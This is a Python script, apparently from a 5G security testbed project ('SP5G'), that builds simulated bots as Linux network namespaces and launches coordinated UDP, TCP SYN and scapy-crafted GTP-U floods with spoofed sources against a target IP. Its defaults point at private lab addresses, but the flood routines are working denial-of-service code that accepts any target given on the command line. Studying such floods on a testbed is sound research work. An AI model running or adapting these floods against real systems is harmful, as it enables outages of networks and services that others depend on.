#!/usr/bin/env python3

import argparse
import sys
import time
import logging
import subprocess
import threading
from typing import List, Dict
import random

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class BotnetController:
    def __init__(self, bot_count=10):
        self.bot_count = bot_count
        self.bots = []
        self.attack_active = False
        self.attack_threads = []
        
        logger.info(f"Botnet Controller initialized with {bot_count} bots")
    
    def create_bots(self):
        logger.info(f"Creating {self.bot_count} bot instances...")
        
        for i in range(self.bot_count):
            bot = {
                'id': i + 1,
                'namespace': f'sp5g-bot-{i+1}',
                'ip': f'10.20.{(i // 254) + 1}.{(i % 254) + 1}',
                'status': 'inactive'
            }
            
            if self._create_bot_namespace(bot):
                self.bots.append(bot)
                logger.info(f"Bot {bot['id']} created: {bot['ip']}")
        
        logger.info(f"Successfully created {len(self.bots)} bots")
    
    def _create_bot_namespace(self, bot):
        try:
            subprocess.run(['sudo', 'ip', 'netns', 'add', bot['namespace']], 
                          check=False, capture_output=True)
            
            subprocess.run(['sudo', 'ip', 'netns', 'exec', bot['namespace'], 
                          'ip', 'link', 'set', 'lo', 'up'], 
                          check=False, capture_output=True)
            
            veth_host = f"veth-bot{bot['id']}-h"
            veth_ns = f"veth-bot{bot['id']}-n"
            
            subprocess.run(['sudo', 'ip', 'link', 'add', veth_host, 'type', 'veth', 
                          'peer', 'name', veth_ns], 
                          check=False, capture_output=True)
            
            subprocess.run(['sudo', 'ip', 'link', 'set', veth_ns, 'netns', bot['namespace']], 
                          check=False, capture_output=True)
            
            host_ip = f"10.20.{(bot['id'] // 254) + 1}.254/24"
            ns_ip = f"{bot['ip']}/24"
            
            subprocess.run(['sudo', 'ip', 'addr', 'add', host_ip, 'dev', veth_host], 
                          check=False, capture_output=True)
            subprocess.run(['sudo', 'ip', 'link', 'set', veth_host, 'up'], 
                          check=False, capture_output=True)
            
            subprocess.run(['sudo', 'ip', 'netns', 'exec', bot['namespace'], 
                          'ip', 'addr', 'add', ns_ip, 'dev', veth_ns], 
                          check=False, capture_output=True)
            subprocess.run(['sudo', 'ip', 'netns', 'exec', bot['namespace'], 
                          'ip', 'link', 'set', veth_ns, 'up'], 
                          check=False, capture_output=True)
            
            subprocess.run(['sudo', 'ip', 'netns', 'exec', bot['namespace'],
                          'ip', 'route', 'add', 'default', 'via', f"10.20.{(bot['id'] // 254) + 1}.254"],
                          check=False, capture_output=True)
            
            return True
        except Exception as e:
            logger.error(f"Error creating bot namespace: {e}")
            return False
    
    def launch_distributed_attack(self, target, attack_type, rate_per_bot=1000, duration=60):
        logger.info(f"Launching distributed {attack_type} attack")
        logger.info(f"Target: {target}, Bots: {len(self.bots)}, Rate/bot: {rate_per_bot}/sec")
        logger.info(f"Total rate: {len(self.bots) * rate_per_bot}/sec, Duration: {duration}sec")
        
        if not self.bots:
            logger.error("No bots available. Create bots first!")
            return
        
        self.attack_active = True
        
        for bot in self.bots:
            thread = threading.Thread(
                target=self._bot_attack_worker,
                args=(bot, target, attack_type, rate_per_bot, duration)
            )
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
            bot['status'] = 'attacking'
        
        for thread in self.attack_threads:
            thread.join()
        
        logger.info("Distributed attack completed")
        
        for bot in self.bots:
            bot['status'] = 'inactive'
    
    def _bot_attack_worker(self, bot, target, attack_type, rate, duration):
        try:
            logger.info(f"Bot {bot['id']} starting attack...")
            
            if attack_type == 'udp_flood':
                self._bot_udp_flood(bot, target, rate, duration)
            elif attack_type == 'tcp_syn_flood':
                self._bot_tcp_syn_flood(bot, target, rate, duration)
            else:
                self._bot_generic_flood(bot, target, rate, duration)
            
            logger.info(f"Bot {bot['id']} attack completed")
        except Exception as e:
            logger.error(f"Bot {bot['id']} error: {e}")
    
    def _bot_udp_flood(self, bot, target, rate, duration):
        cmd = [
            'sudo', 'ip', 'netns', 'exec', bot['namespace'],
            'hping3', '-2', '-c', str(rate * duration), '-p', '2152',
            '--flood', '--rand-source', target
        ]
        
        try:
            subprocess.run(cmd, timeout=duration + 5, check=False, capture_output=True)
        except subprocess.TimeoutExpired:
            pass
    
    def _bot_tcp_syn_flood(self, bot, target, rate, duration):
        cmd = [
            'sudo', 'ip', 'netns', 'exec', bot['namespace'],
            'hping3', '-S', '-c', str(rate * duration), '-p', '38472',
            '--flood', '--rand-source', target
        ]
        
        try:
            subprocess.run(cmd, timeout=duration + 5, check=False, capture_output=True)
        except subprocess.TimeoutExpired:
            pass
    
    def _bot_generic_flood(self, bot, target, rate, duration):
        from scapy.all import IP, UDP, Raw, send
        
        start_time = time.time()
        sent_count = 0
        
        while time.time() - start_time < duration and self.attack_active:
            batch_start = time.time()
            
            for _ in range(rate):
                if not self.attack_active:
                    break
                
                try:
                    pkt = IP(src=bot['ip'], dst=target) / \
                          UDP(sport=random.randint(30000, 60000), dport=2152) / \
                          Raw(load=b'\x00' * 1024)
                    
                    send(pkt, verbose=0)
                    sent_count += 1
                except:
                    pass
            
            elapsed = time.time() - batch_start
            if elapsed < 1.0:
                time.sleep(1.0 - elapsed)
    
    def simulate_worm_spread(self, initial_infected=1, spread_rate=2):
        logger.info(f"Simulating worm spread...")
        logger.info(f"Initial infected: {initial_infected}, Spread rate: {spread_rate} bots/sec")
        
        if not self.bots or len(self.bots) < initial_infected:
            logger.error("Not enough bots for worm simulation")
            return
        
        infected = self.bots[:initial_infected]
        for bot in infected:
            bot['status'] = 'infected'
        
        logger.info(f"Initially infected: {len(infected)} bots")
        
        while len(infected) < len(self.bots):
            time.sleep(1.0 / spread_rate)
            
            uninfected = [b for b in self.bots if b['status'] != 'infected']
            if not uninfected:
                break
            
            newly_infected = random.choice(uninfected)
            newly_infected['status'] = 'infected'
            infected.append(newly_infected)
            
            logger.info(f"Bot {newly_infected['id']} infected. Total infected: {len(infected)}/{len(self.bots)}")
        
        logger.info(f"Worm spread complete. All {len(infected)} bots infected.")
    
    def stop_attack(self):
        logger.info("Stopping all bot attacks...")
        self.attack_active = False
        
        for bot in self.bots:
            bot['status'] = 'inactive'
    
    def cleanup(self):
        logger.info("Cleaning up botnet...")
        
        self.stop_attack()
        
        for bot in self.bots:
            try:
                subprocess.run(['sudo', 'ip', 'netns', 'del', bot['namespace']], 
                              check=False, capture_output=True)
                logger.info(f"Removed bot {bot['id']} namespace")
            except Exception as e:
                logger.error(f"Error removing bot {bot['id']}: {e}")
        
        self.bots = []
        logger.info("Botnet cleanup completed")
    
    def get_status(self):
        return {
            'bot_count': len(self.bots),
            'bots': self.bots,
            'attack_active': self.attack_active
        }

def main():
    parser = argparse.ArgumentParser(description='Distributed DDoS Botnet Controller')
    parser.add_argument('--target', required=True, help='Target IP address')
    parser.add_argument('--mode', default='manual', choices=['manual', 'auto'], help='Attack mode')
    parser.add_argument('--bots', type=int, default=10, help='Number of bots')
    parser.add_argument('--rate', type=int, default=1000, help='Attack rate per bot (packets/sec)')
    parser.add_argument('--duration', type=int, default=60, help='Attack duration (seconds)')
    parser.add_argument('--attack-type', default='udp_flood', 
                       choices=['udp_flood', 'tcp_syn_flood', 'generic'],
                       help='Type of attack')
    parser.add_argument('--worm-spread', action='store_true', help='Simulate worm spread before attack')
    parser.add_argument('--cleanup', action='store_true', help='Cleanup botnet and exit')
    
    args = parser.parse_args()
    
    target_map = {
        'cu_cp': '192.168.71.130',
        'cu_up': '192.168.71.131',
        'du': '192.168.71.132'
    }
    
    target = target_map.get(args.target, args.target)
    
    logger.info("="*60)
    logger.info("Distributed DDoS Botnet Controller - SP5G Project")
    logger.info("="*60)
    
    controller = BotnetController(args.bots)
    
    try:
        if args.cleanup:
            controller.cleanup()
            logger.info("Cleanup completed")
            return
        
        controller.create_bots()
        
        if args.worm_spread:
            controller.simulate_worm_spread(initial_infected=1, spread_rate=2)
            time.sleep(2)
        
        controller.launch_distributed_attack(
            target=target,
            attack_type=args.attack_type,
            rate_per_bot=args.rate,
            duration=args.duration
        )
        
        logger.info("Attack finished successfully")
        
    except KeyboardInterrupt:
        logger.info("Attack interrupted by user")
        controller.stop_attack()
    except Exception as e:
        logger.error(f"Error: {e}")
        sys.exit(1)
    finally:
        if not args.cleanup:
            cleanup = input("\nCleanup botnet namespaces? (y/n): ")
            if cleanup.lower() == 'y':
                controller.cleanup()

if __name__ == '__main__':
    main()



